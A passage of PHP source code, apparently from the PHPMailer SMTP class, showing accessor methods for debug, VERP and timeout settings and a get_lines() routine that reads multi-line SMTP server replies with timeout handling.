     * @return array
     */
    public function getError()
    {
        return $this->error;
    }

    /**
     * Get the last reply from the server.
     * @access public
     * @return string
     */
    public function getLastReply()
    {
        return $this->last_reply;
    }

    /**
     * Read the SMTP server's response.
     * Either before eof or socket timeout occurs on the operation.
     * With SMTP we can tell if we have more lines to read if the
     * 4th character is '-' symbol. If it is a space then we don't
     * need to read anything else.
     * @access protected
     * @return string
     */
    protected function get_lines()
    {
        $data = '';
        $endtime = 0;
        // If the connection is bad, give up now
        if (!is_resource($this->smtp_conn)) {
            return $data;
        }
        stream_set_timeout($this->smtp_conn, $this->Timeout);
        if ($this->Timelimit > 0) {
            $endtime = time() + $this->Timelimit;
        }
        while (is_resource($this->smtp_conn) && !feof($this->smtp_conn)) {
            $str = @fgets($this->smtp_conn, 515);
            if ($this->do_debug >= 4) {
                $this->edebug("SMTP -> get_lines(): \$data was \"$data\"");
                $this->edebug("SMTP -> get_lines(): \$str is \"$str\"");
            }
            $data .= $str;
            if ($this->do_debug >= 4) {
                $this->edebug("SMTP -> get_lines(): \$data is \"$data\"");
            }
            // if 4th character is a space, we are done reading, break the loop
            if (substr($str, 3, 1) == ' ') {
                break;
            }
            // Timed-out? Log and break
            $info = stream_get_meta_data($this->smtp_conn);
            if ($info['timed_out']) {
                if ($this->do_debug >= 4) {
                    $this->edebug(
                        'SMTP -> get_lines(): timed-out (' . $this->Timeout . ' sec)'
                    );
                }
                break;
            }
            // Now check if reads took too long
            if ($endtime) {
                if (time() > $endtime) {
                    if ($this->do_debug >= 4) {
                        $this->edebug(
                            'SMTP -> get_lines(): timelimit reached ('
                            . $this->Timelimit . ' sec)'
                        );
                    }
                    break;
                }
            }
        }
        return $data;
    }

    /**
     * Enable or disable VERP address generation.
     * @param bool $enabled
     */
    public function setVerp($enabled = false)
    {
        $this->do_verp = $enabled;
    }

    /**
     * Get VERP address generation mode.
     * @return bool
     */
    public function getVerp()
    {
        return $this->do_verp;
    }

    /**
     * Set debug output method.
     * @param string $method The function/method to use for debugging output.
     */
    public function setDebugOutput($method = 'echo')
    {
        $this->Debugoutput = $method;
    }

    /**
     * Get debug output method.
     * @return string
     */
    public function getDebugOutput()
    {
        return $this->Debugoutput;
    }

    /**
     * Set debug output level.
     * @param int $level
     */
    public function setDebugLevel($level = 0)
    {
        $this->do_debug = $level;
    }

    /**
     * Get debug output level.
     * @return int
     */
    public function getDebugLevel()
    {
        return $this->do_debug;
    }

    /**
     * Set SMTP timeout.
     * @param int $timeout
     */
    public function setTimeout($timeout = 0)
    {
        $this->Timeout = $timeout;
    }

    /**
     * Get SMTP timeout.
     * @return int
     */
    public function getTimeout()
    {
        return $this->Timeout;
    }
}
